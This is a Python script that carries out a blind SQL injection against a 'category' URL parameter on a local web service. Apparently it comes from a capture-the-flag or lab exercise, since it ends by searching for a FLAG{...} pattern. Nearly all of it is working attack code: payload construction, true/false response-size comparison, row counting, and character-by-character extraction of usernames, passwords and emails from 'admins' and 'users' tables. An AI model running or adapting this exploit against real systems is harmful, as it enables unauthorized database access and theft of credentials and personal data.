import requests
import urllib.parse
import time
import string
import sys

target = "http://127.0.0.1:32780/"
session_cookie = {"PHPSESSID": "a619c2d322b0d2025997d9751eb6d09a"}

def send_payload(payload):
    """Send SQL injection payload and return response"""
    encoded = urllib.parse.quote(payload)
    url = f"{target}?category={encoded}"
    try:
        start_time = time.time()
        r = requests.get(url, cookies=session_cookie, timeout=15)
        elapsed = time.time() - start_time
        return r.text, r.status_code, len(r.text), elapsed
    except Exception as e:
        return f"Error: {e}", 0, 0, 0

def get_baseline():
    """Get baseline response for comparison"""
    print("Getting baseline response...")
    response, status, size, elapsed = send_payload("Nature")  # Valid category
    print(f"Baseline - Status: {status} | Size: {size}B | Time: {elapsed:.3f}s")
    return size, elapsed

def test_boolean_condition(condition):
    """Test boolean condition by measuring response size"""
    payload = f"1' AND ({condition})--"
    response, status, size, elapsed = send_payload(payload)
    return size

def extract_data_blind(table, column, row_num=0, max_length=50):
    """Extract data using blind SQL injection (character by character)"""
    print(f"\n{'='*80}")
    print(f"Extracting data from {table}.{column} (row {row_num})")
    print(f"{'='*80}")
    
    # Determine baseline response sizes (true vs false conditions)
    true_payload = "1' AND 1=1--"
    false_payload = "1' AND 1=2--"
    
    true_response, _, true_size, _ = send_payload(true_payload)
    false_response, _, false_size, _ = send_payload(false_payload)
    
    print(f"True condition size: {true_size}B")
    print(f"False condition size: {false_size}B")
    print(f"Size difference: {abs(true_size - false_size)}B")
    
    if true_size == false_size:
        print("[!] No size difference detected - blind injection may not work")
        return None
    
    extracted = ""
    charset = string.ascii_letters + string.digits + "_!@#$%^&*()+-=[]{}|;:',.<>?/~`"
    
    for position in range(1, max_length + 1):
        found_char = False
        
        for char in charset:
            # Check if character matches at this position
            condition = f"SUBSTRING((SELECT {column} FROM {table} LIMIT {row_num},1),{position},1)='{char}'"
            payload = f"1' AND {condition}--"
            
            response, status, size, _ = send_payload(payload)
            
            # If response size matches true condition, we found the character
            if abs(size - true_size) < 5:  # Allow small variance
                extracted += char
                print(f"[+] Position {position}: '{char}' (current: {extracted})")
                found_char = True
                break
        
        if not found_char:
            # Try special characters and space
            special_chars = [" ", "-", ".", "@", "_"]
            for char in special_chars:
                condition = f"SUBSTRING((SELECT {column} FROM {table} LIMIT {row_num},1),{position},1)='{char}'"
                payload = f"1' AND {condition}--"
                response, status, size, _ = send_payload(payload)
                
                if abs(size - true_size) < 5:
                    extracted += char
                    print(f"[+] Position {position}: '{char}' (current: {extracted})")
                    found_char = True
                    break
            
            if not found_char:
                # Check if we've reached the end of the string
                end_check = f"LENGTH((SELECT {column} FROM {table} LIMIT {row_num},1))<{position}"
                payload = f"1' AND {end_check}--"
                response, status, size, _ = send_payload(payload)
                
                if abs(size - true_size) < 5:
                    print(f"[+] End of string reached at position {position-1}")
                    break
                else:
                    print(f"[-] No match found at position {position}, trying next...")
                    extracted += "?"
    
    print(f"\n{'='*80}")
    print(f"[FINAL EXTRACTED DATA]: '{extracted}'")
    print(f"{'='*80}")
    return extracted

def count_rows(table):
    """Count number of rows in a table"""
    print(f"\nCounting rows in {table}...")
    
    true_payload = "1' AND 1=1--"
    false_payload = "1' AND 1=2--"
    
    _, _, true_size, _ = send_payload(true_payload)
    _, _, false_size, _ = send_payload(false_payload)
    
    for count in range(0, 100):
        condition = f"(SELECT COUNT(*) FROM {table})>{count}"
        payload = f"1' AND {condition}--"
        response, status, size, _ = send_payload(payload)
        
        if abs(size - false_size) < 5:
            print(f"[+] {table} has {count} rows")
            return count
    
    return 0

print("="*80)
print("BLIND SQL INJECTION - DATA EXTRACTION")
print("="*80)

# First, test if the vulnerability is confirmed
test_payloads = [
    ("True condition", "1' AND 1=1--"),
    ("False condition", "1' AND 1=2--"),
]

print("\nConfirming blind SQL injection vulnerability...")
print("="*80)

for name, payload in test_payloads:
    response, status, size, elapsed = send_payload(payload)
    print(f"{name}: Status={status} | Size={size}B | Time={elapsed:.3f}s")

# Count rows in admins table
admin_count = count_rows("admins")
print(f"\nFound {admin_count} rows in admins table")

# Extract data using blind injection
if admin_count > 0:
    # Try to extract all columns we can
    columns_to_try = ["username", "password", "user", "pass", "email", "role", "id", "name"]
    
    print(f"\n{'='*80}")
    print("EXTRACTING ALL POSSIBLE DATA FROM ADMINS TABLE")
    print(f"{'='*80}")
    
    extracted_data = {}
    
    for row in range(admin_count):
        print(f"\n{'='*60}")
        print(f"EXTRACTING ROW {row}")
        print(f"{'='*60}")
        
        for column in columns_to_try:
            try:
                print(f"\nAttempting to extract {column}...")
                data = extract_data_blind("admins", column, row, 30)
                if data and data.strip():
                    extracted_data[f"row{row}_{column}"] = data
                    print(f"[SUCCESS] Extracted: {data}")
            except Exception as e:
                print(f"[-] Error extracting {column}: {e}")
                continue
    
    print(f"\n{'='*80}")
    print("FINAL EXTRACTED DATA SUMMARY")
    print(f"{'='*80}")
    for key, value in extracted_data.items():
        print(f"{key}: {value}")

# Also try to extract from other common tables
print(f"\n{'='*80}")
print("EXTRACTING FROM USERS TABLE")
print(f"{'='*80}")

user_count = count_rows("users")
if user_count > 0:
    for row in range(min(user_count, 3)):  # Extract first 3 users
        print(f"\n--- Extracting row {row} from users ---")
        for column in ["username", "password", "email"]:
            try:
                data = extract_data_blind("users", column, row, 30)
                if data and data.strip():
                    print(f"[EXTRACTED] users.{column}[{row}]: {data}")
            except:
                continue

# Search for FLAG in any extracted data
print(f"\n{'='*80}")
print("SEARCHING FOR FLAG PATTERN IN EXTRACTED DATA")
print(f"{'='*80}")

flag_pattern = r'FLAG\{[^}]+\}'
for key, value in extracted_data.items():
    import re
    matches = re.findall(flag_pattern, value)
    if matches:
        print(f"[!] FLAG FOUND in {key}: {matches[0]}")
        sys.exit(0)

print("\nBlind SQL injection extraction completed.")
